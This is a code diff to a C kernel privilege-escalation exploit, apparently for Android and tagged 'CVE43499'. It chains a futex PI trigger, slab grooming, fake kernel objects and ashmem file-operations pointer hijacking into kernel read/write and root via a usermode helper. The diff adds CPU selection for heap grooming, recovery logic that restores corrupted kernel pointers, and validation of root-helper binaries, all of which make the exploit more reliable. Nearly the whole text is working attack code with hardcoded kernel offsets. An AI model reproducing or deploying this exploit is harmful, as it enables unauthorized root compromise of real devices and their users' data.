@@ -24,6 +24,8 @@
 #include <unistd.h>
 
 #include "08_ashmem_configfs_rw.h"
+#include "00_cpu_discovery.h"
+#include "04_fake_kernel_objects.h"
 #include "07_futex_pi_trigger.h"
 #include "05_mm_slab_grooming.h"
 #include "01_kernel_base_tracefs.h"
@@ -66,7 +68,7 @@ enum attempt_kernel_state {
   ATTEMPT_KERNEL_MUTATED = 2,
   ATTEMPT_FOPS_RESTORED = 3,
   ATTEMPT_PIPE_READY = 4,
-  ATTEMPT_WORKQUEUE_MUTATED = 5,
+  ATTEMPT_NATIVE_WORK_SUBMITTED = 5,
   ATTEMPT_ROOT_READY = 6,
 };
 
@@ -80,8 +82,26 @@ struct attempt_shared_state {
 _Static_assert(sizeof(struct attempt_shared_state) == 0x20,
                "attempt_shared_state must occupy exactly 0x20 bytes");
 
-static int pin_to_cpu(int cpu);
 static void raise_rlimit_to_max(int resource);
+
+static int validate_executable_elf(const char *path, off_t minimum_size) {
+  struct stat info;
+  unsigned char magic[4];
+  if (!path || path[0] != '/' || stat(path, &info) != 0 ||
+      !S_ISREG(info.st_mode) || info.st_size < minimum_size ||
+      access(path, X_OK) != 0) {
+    return 0;
+  }
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) return 0;
+  ssize_t count;
+  do {
+    count = read(fd, magic, sizeof(magic));
+  } while (count < 0 && errno == EINTR);
+  int close_result = close(fd);
+  return count == (ssize_t)sizeof(magic) && close_result == 0 &&
+         memcmp(magic, "\x7f" "ELF", sizeof(magic)) == 0;
+}
 
 static pid_t spawn_allocation_keeper(void) {
   pid_t child = fork();
@@ -123,6 +143,65 @@ struct do_one_attempt_ctx {
   struct attempt_shared_state *shared;
 };
 
+static int restore_ashmem_fops_with_fd(int fd,
+                                       uint64_t ashmem_misc_fops_addr,
+                                       uint64_t real_ashmem_fops,
+                                       int *write_completed) {
+  uint64_t restored_fops = 0;
+  *write_completed = oss_kernel_write(fd, ashmem_misc_fops_addr,
+                                      &real_ashmem_fops,
+                                      sizeof(real_ashmem_fops));
+  int confirmed = *write_completed &&
+                  oss_kernel_read(fd, ashmem_misc_fops_addr, &restored_fops,
+                                  sizeof(restored_fops)) &&
+                  restored_fops == real_ashmem_fops;
+  fprintf(stderr,
+          "[immediate] restore ashmem_misc.fops got=%016llx want=%016llx "
+          "write=%d confirmed=%d\n",
+          (unsigned long long)restored_fops,
+          (unsigned long long)real_ashmem_fops, *write_completed, confirmed);
+  return confirmed;
+}
+
+static void recover_ashmem_fops(struct do_one_attempt_ctx *ctx,
+                                uint64_t ashmem_misc_fops_addr,
+                                uint64_t real_ashmem_fops) {
+  uint64_t recovery_fops =
+      ctx->payload_base | OSS_RECOVERY_FOPS_LIVE_OFFSET;
+  int redirected = futex_v14_rewrite_pointer(
+      ctx->payload_base, ashmem_misc_fops_addr, recovery_fops);
+  fprintf(stderr,
+          "[recovery] second write target=%016llx replacement=%016llx "
+          "scheduled=%d\n",
+          (unsigned long long)ashmem_misc_fops_addr,
+          (unsigned long long)recovery_fops, redirected);
+
+  if (redirected) {
+    int recovery_fd = oss_open_kernel_rw();
+    if (recovery_fd >= 0) {
+      int write_completed = 0;
+      int confirmed = restore_ashmem_fops_with_fd(
+          recovery_fd, ashmem_misc_fops_addr, real_ashmem_fops,
+          &write_completed);
+      if (write_completed) {
+        __atomic_store_n(&ctx->shared->status, ATTEMPT_FOPS_RESTORED,
+                         __ATOMIC_RELEASE);
+        close(recovery_fd);
+        fprintf(stderr,
+                "[recovery] real ashmem fops restored confirmed=%d\n",
+                confirmed);
+        return;
+      }
+    }
+  }
+
+  int quarantined = futex_v14_quarantine_pointer(
+      ctx->payload_base, ashmem_misc_fops_addr);
+  fprintf(stderr,
+          "[recovery] restore unavailable; null quarantine scheduled=%d\n",
+          quarantined);
+}
+
 static int do_one_attempt_post_trigger(void *ctx_v) {
   struct do_one_attempt_ctx *ctx = (struct do_one_attempt_ctx *)ctx_v;
   uint64_t ashmem_misc_fops_addr = ctx->kernel_base + 0x02bfcf28ULL;
@@ -138,6 +217,8 @@ static int do_one_attempt_post_trigger(void *ctx_v) {
      * sched_setattr can mean the global fops pointer changed. Retrying after
      * that would free the reclaimed page while the kernel may still use it. */
     fprintf(stderr, "[immediate] open resolved ashmem node failed\n");
+    recover_ashmem_fops(ctx, ashmem_misc_fops_addr,
+                        ctx->kernel_base + 0x0200d4b8ULL);
     return 0;
   }
   int verified = oss_verify_kernel_access_ex(
@@ -145,24 +226,22 @@ static int do_one_attempt_post_trigger(void *ctx_v) {
   fprintf(stderr, "[immediate] verify (called immediately, same thread) = %d\n",
           verified);
   if (!verified) {
-    close(fd);
+    recover_ashmem_fops(ctx, ashmem_misc_fops_addr,
+                        ctx->kernel_base + 0x0200d4b8ULL);
     return 0;
   }
 
   uint64_t real_ashmem_fops = ctx->kernel_base + 0x0200d4b8ULL;
-  uint64_t restored_fops = 0;
-  int restore_ok = oss_kernel_write(fd, ashmem_misc_fops_addr,
-                                    &real_ashmem_fops,
-                                    sizeof(real_ashmem_fops)) &&
-                   oss_kernel_read(fd, ashmem_misc_fops_addr, &restored_fops,
-                                   sizeof(restored_fops)) &&
-                   restored_fops == real_ashmem_fops;
-  fprintf(stderr,
-          "[immediate] restore ashmem_misc.fops got=%016llx want=%016llx ok=%d\n",
-          (unsigned long long)restored_fops,
-          (unsigned long long)real_ashmem_fops, restore_ok);
+  int write_completed = 0;
+  int restore_ok = restore_ashmem_fops_with_fd(
+      fd, ashmem_misc_fops_addr, real_ashmem_fops, &write_completed);
   if (!restore_ok) {
-    close(fd);
+    if (write_completed) {
+      __atomic_store_n(&ctx->shared->status, ATTEMPT_FOPS_RESTORED,
+                       __ATOMIC_RELEASE);
+    } else {
+      recover_ashmem_fops(ctx, ashmem_misc_fops_addr, real_ashmem_fops);
+    }
     return 0;
   }
   __atomic_store_n(&ctx->shared->status, ATTEMPT_FOPS_RESTORED,
@@ -177,14 +256,15 @@ static int do_one_attempt_post_trigger(void *ctx_v) {
   __atomic_store_n(&ctx->shared->status, ATTEMPT_PIPE_READY,
                    __ATOMIC_RELEASE);
 
-  /* Root bootstrap uses configfs only for SELinux/static workqueue lookup;
-   * dynamic workqueue state uses the already-proven pipe R/W primitive. */
+  /* Root bootstrap publishes a disposable PTY work item through the kernel's
+   * native schedule_work() path and restores the PTY after completion. */
   int rooted = root_umh_install_fd_tracked(
       fd, ctx->kernel_base, ctx->payload_base, ctx->root_umh_path,
-      &ctx->shared->status, ATTEMPT_WORKQUEUE_MUTATED);
+      &ctx->shared->status, ATTEMPT_NATIVE_WORK_SUBMITTED);
   uint64_t null_owner = 0;
-  int owner_cleared = oss_kernel_write(fd, ctx->payload_base | 0x1180ULL,
-                                       &null_owner, sizeof(null_owner));
+  int owner_cleared = oss_kernel_write(
+      fd, ctx->payload_base | OSS_PRIMARY_FOPS_LIVE_OFFSET, &null_owner,
+      sizeof(null_owner));
   fprintf(stderr, "[immediate] fake fops owner clear=%d\n", owner_cleared);
   close(fd);
   rooted = rooted && owner_cleared;
@@ -205,24 +285,13 @@ static int do_one_attempt(struct attempt_shared_state *shared,
   raise_rlimit_to_max(RLIMIT_NPROC);
 
   const char *root_umh_path = getenv("CVE43499_ROOT_HELPER");
-  struct stat helper_stat;
-  unsigned char helper_magic[4] = {0};
-  int helper_fd = root_umh_path && root_umh_path[0] == '/'
-                      ? open(root_umh_path, O_RDONLY | O_CLOEXEC)
-                      : -1;
-  ssize_t helper_got = -1;
-  if (helper_fd >= 0) {
-    do {
-      helper_got = pread(helper_fd, helper_magic, sizeof(helper_magic), 0);
-    } while (helper_got < 0 && errno == EINTR);
-  }
-  int helper_close = helper_fd >= 0 ? close(helper_fd) : -1;
-  if (!root_umh_path || stat(root_umh_path, &helper_stat) != 0 ||
-      !S_ISREG(helper_stat.st_mode) || helper_stat.st_size < 4096 ||
-      access(root_umh_path, X_OK) != 0 ||
-      helper_got != (ssize_t)sizeof(helper_magic) || helper_close != 0 ||
-      memcmp(helper_magic, "\x7f" "ELF", sizeof(helper_magic)) != 0) {
+  if (!validate_executable_elf(root_umh_path, 4096)) {
     fprintf(stderr, "[preflight] invalid root helper errno=%d\n", errno);
+    return 0;
+  }
+  const char *mm_factory_path = getenv("CVE43499_MM_FACTORY");
+  if (!validate_executable_elf(mm_factory_path, 1)) {
+    fprintf(stderr, "[preflight] invalid mm exec factory errno=%d\n", errno);
     return 0;
   }
 
@@ -230,10 +299,19 @@ static int do_one_attempt(struct attempt_shared_state *shared,
     fprintf(stderr, "[aar_aaw] no openable ashmem node before exploit\n");
     return 0;
   }
-  if (!pin_to_cpu(0)) {
-    fprintf(stderr, "[preflight] CPU-0 affinity failed errno=%d\n", errno);
+  struct cpu_discovery_result cpu_result;
+  if (!cpu_discovery_select(&cpu_result) ||
+      !cpu_discovery_pin_and_validate(cpu_result.cpu, &cpu_result)) {
+    fprintf(stderr, "[preflight] groom CPU selection failed errno=%d\n", errno);
     return 0;
   }
+  groom_set_cpu(cpu_result.cpu);
+  fprintf(stderr,
+          "[groom] cpu selected=%d capacity=%ld max_freq_khz=%ld "
+          "core_ctl_known=%d paused=%d not_preferred=%d\n",
+          cpu_result.cpu, cpu_result.capacity, cpu_result.max_frequency_khz,
+          cpu_result.core_ctl_known, cpu_result.paused,
+          cpu_result.not_preferred);
 
   puts("\x1b[33m[*] \x1b[0mstage=locating-kernel");
   uint64_t kernel_base = 0;
@@ -346,13 +424,6 @@ static int do_one_attempt(struct attempt_shared_state *shared,
     fprintf(stderr, "[holder] pid=%d name=cve43499-hold\n", keeper);
   }
   return triggered;
-}
-
-static int pin_to_cpu(int cpu) {
-  cpu_set_t set;
-  CPU_ZERO(&set);
-  CPU_SET(cpu, &set);
-  return sched_setaffinity(0, sizeof(set), &set) == 0;
 }
 
 static void raise_rlimit_to_max(int resource) {
